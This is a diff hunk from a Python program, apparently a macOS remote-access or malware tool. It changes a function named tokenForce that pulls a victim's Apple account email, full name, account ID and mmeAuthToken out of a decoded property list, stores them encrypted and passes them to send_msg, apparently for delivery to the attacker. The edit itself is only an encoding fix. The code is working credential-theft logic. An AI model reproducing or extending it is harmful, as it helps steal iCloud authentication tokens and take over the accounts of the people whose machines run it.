@@ -1647,7 +1647,7 @@ def tokenForce():
 		token_plist = NSPropertyListSerialization.propertyListWithData_options_format_error_(binToPlist, 0, None, None)[0]
 		tokz = "[%s | %s]\n" % (token_plist["appleAccountInfo"]["primaryEmail"], token_plist["appleAccountInfo"]["fullName"])
 		tokz += "%s:%s\n" % (token_plist["appleAccountInfo"]["dsPrsID"], token_plist["tokens"]["mmeAuthToken"])
-		logged = updateDB(encrypt(tokz), 'mme_token') #update the DB....
+		logged = updateDB(encrypt(tokz.decode('utf-8').encode('ascii', 'ignore')), 'mme_token') #update the DB....
 		send_msg(tokz, True)
 		return 1
 
